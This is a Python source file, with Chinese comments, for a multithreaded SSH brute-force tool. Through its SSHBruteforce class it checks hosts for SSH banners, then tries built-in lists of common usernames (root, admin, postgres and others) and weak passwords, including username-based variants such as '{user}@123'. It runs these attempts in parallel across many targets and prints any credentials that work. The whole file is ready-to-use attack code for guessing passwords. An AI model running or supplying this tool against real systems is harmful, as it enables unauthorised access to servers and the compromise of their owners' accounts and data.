import paramiko
import threading
from typing import Dict, List, Set, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
import concurrent.futures
from colorama import Fore, Style
import time
import socket
import logging
from lib.utils.logger import setup_logger

# 禁用 paramiko 的警告日志
logging.getLogger('paramiko').setLevel(logging.CRITICAL)

class SSHBruteforce:
    def __init__(self, threads: int = 10):
        self.threads = threads
        self._lock = threading.Lock()
        self.results = {}
        self.total_attempts = 0
        self.current_attempts = 0
        self.errors = 0
        self.skip_ips = set()
        self.valid_targets = set()  # 存储有效的目标
        
        # 默认用户名列表 - 最常见的优先
        self.default_users = [
            'root', 'admin',         # 超级管理员
            'ubuntu', 'centos',      # 系统默认用户
            'www', 'nginx',          # Web服务用户
            'mysql', 'postgres',     # 数据库用户
            'oracle', 'tomcat',      # 应用服务用户
            'test', 'guest',         # 测试账号
            'hadoop', 'ftp',         # 服务账号
            'git', 'svn'             # 版本控制用户
        ]
        
        # 默认密码列表 - 最常见的优先
        self.default_passwords = [
            '',                                         # 空密码
            'root', 'admin', 'password',               # 简单密码
            '1','123456', '12345', '123', '1234',         # 数字密码
            '{user}', '{user}123', '{user}@123',      # 用户名变体
            '{user}@2023', '{user}@2024',             # 年份变体
            'P@ssw0rd', 'Admin@123', 'Root@123',      # 复杂密码
            'admin123', 'root123', 'password123',      # 常见组合
            'qwerty', 'abc123', '123qwe',             # 键盘组合
            '1qaz@WSX', '1qaz2wsx'                    # 特殊组合
        ]

    def verify_ssh(self, ip: str, port: int) -> bool:
        """快速验证SSH服务"""
        try:
            sock = socket.create_connection((ip, port), timeout=1)
            sock.settimeout(1)
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            sock.close()
            return 'ssh' in banner.lower()
        except:
            return False

    def try_login(self, ip: str, port: int, username: str, password: str) -> Optional[Tuple[str, str]]:
        """尝试SSH登录"""
        if ip not in self.valid_targets:
            return None
            
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            # 使用socket先测试连接
            sock = socket.create_connection((ip, port), timeout=1)
            
            # 设置更短的超时时间
            ssh.connect(
                hostname=ip,
                port=port,
                username=username,
                password=password,
                timeout=1,
                auth_timeout=2,  # 认证超时稍长一些
                banner_timeout=1,
                allow_agent=False,
                look_for_keys=False,
                sock=sock  # 使用已建立的socket
            )
            return (username, password)
        except paramiko.AuthenticationException:
            return None
        except (socket.error, paramiko.SSHException):
            self.skip_ips.add(ip)
            return None
        finally:
            try:
                ssh.close()
            except:
                pass

    def scan_target(self, ip: str, port: int) -> None:
        """扫描单个SSH目标的所有用户名和密码组合"""
        if not self.verify_ssh(ip, port):
            with self._lock:
                self.errors += 1
            return

        self.valid_targets.add(ip)
        
        # 为这个目标创建独立的线程池
        with ThreadPoolExecutor(max_workers=5) as target_executor:
            futures = []
            
            # 为每个用户名创建任务
            for username in self.default_users:
                if ip in self.skip_ips:
                    break
                    
                # 生成密码列表
                passwords = [
                    pwd.format(user=username) if '{user}' in pwd else pwd
                    for pwd in self.default_passwords
                ]
                
                # 优先尝试空密码和简单密码
                passwords.sort(key=len)
                
                # 提交密码尝试任务
                for password in passwords:
                    if ip in self.skip_ips:
                        break
                        
                    futures.append(
                        target_executor.submit(
                            self.try_credential, 
                            ip, 
                            port, 
                            username, 
                            password
                        )
                    )
            
            # 处理该目标的所有尝试结果
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        username, password = result
                        with self._lock:
                            if ip not in self.results:
                                self.results[ip] = []
                            self.results[ip].append({
                                'port': port,
                                'username': username,
                                'password': password
                            })
                            print(f"\r{' ' * 100}\r{Fore.RED}[+] SSH Found: {ip}:{port} {username}:{password}{Style.RESET_ALL}")
                        return  # 找到一个成功的就停止
                except Exception:
                    continue

    def try_credential(self, ip: str, port: int, username: str, password: str) -> Optional[Tuple[str, str]]:
        """尝试单个凭据组合"""
        with self._lock:
            self.current_attempts += 1
            self._current_user = username
            self._current_pass = password
        
        return self.try_login(ip, port, username, password)

    def scan(self, ssh_ports: Dict[str, Set[int]], userfile: str = None, passfile: str = None) -> Dict:
        """执行SSH爆破"""
        if userfile:
            with open(userfile) as f:
                self.default_users = [line.strip() for line in f if line.strip()]
        
        if passfile:
            with open(passfile) as f:
                self.default_passwords = [line.strip() for line in f if line.strip()]

        # 计算总尝试次数
        total_targets = sum(len(ports) for ports in ssh_ports.values())
        self.total_attempts = total_targets * len(self.default_users) * len(self.default_passwords)
        self.current_attempts = 0
        self.errors = 0
        self._current_user = ''
        self._current_pass = ''
        self.valid_targets.clear()
        self.skip_ips.clear()

        print(f"\n{Fore.YELLOW}[*] Starting SSH bruteforce for {total_targets} targets...{Style.RESET_ALL}\n")
        print(f"{Fore.YELLOW}[*] Using {len(self.default_users)} usernames and {len(self.default_passwords)} passwords{Style.RESET_ALL}")
        
        start_time = time.time()
        try:
            # 为每个目标创建独立的扫描线程
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = []
                for ip, ports in ssh_ports.items():
                    for port in ports:
                        futures.append(
                            executor.submit(self.scan_target, ip, port)
                        )
                
                # 显示总体进度
                completed = 0
                total = len(futures)
                
                for future in as_completed(futures):
                    completed += 1
                    elapsed = time.time() - start_time
                    speed = self.current_attempts / elapsed if elapsed > 0 else 0
                    progress = (completed / total) * 100
                    
                    print(f"\r{Fore.BLUE}[*] Progress: {progress:.1f}% ({completed}/{total}) "
                          f"Speed: {speed:.1f} attempts/s "
                          f"Current: {self._current_user}:{self._current_pass} "
                          f"Errors: {self.errors}{Style.RESET_ALL}", end='')

        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] SSH bruteforce interrupted by user{Style.RESET_ALL}")
        
        elapsed = time.time() - start_time
        if self.results:
            print(f"\n{Fore.GREEN}[*] SSH bruteforce completed in {elapsed:.1f}s. "
                  f"Found {len(self.results)} valid credentials. "
                  f"Errors: {self.errors}{Style.RESET_ALL}\n")
            
            # 显示所有成功的结果
            print(f"{Fore.GREEN}[*] Valid credentials found:{Style.RESET_ALL}")
            for ip, creds in self.results.items():
                for cred in creds:
                    print(f"{Fore.GREEN}    {ip}:{cred['port']} - {cred['username']}:{cred['password']}{Style.RESET_ALL}")
            print()
        else:
            print(f"\n{Fore.YELLOW}[*] SSH bruteforce completed in {elapsed:.1f}s. "
                  f"No valid credentials found. "
                  f"Errors: {self.errors}{Style.RESET_ALL}\n")
            
        return self.results 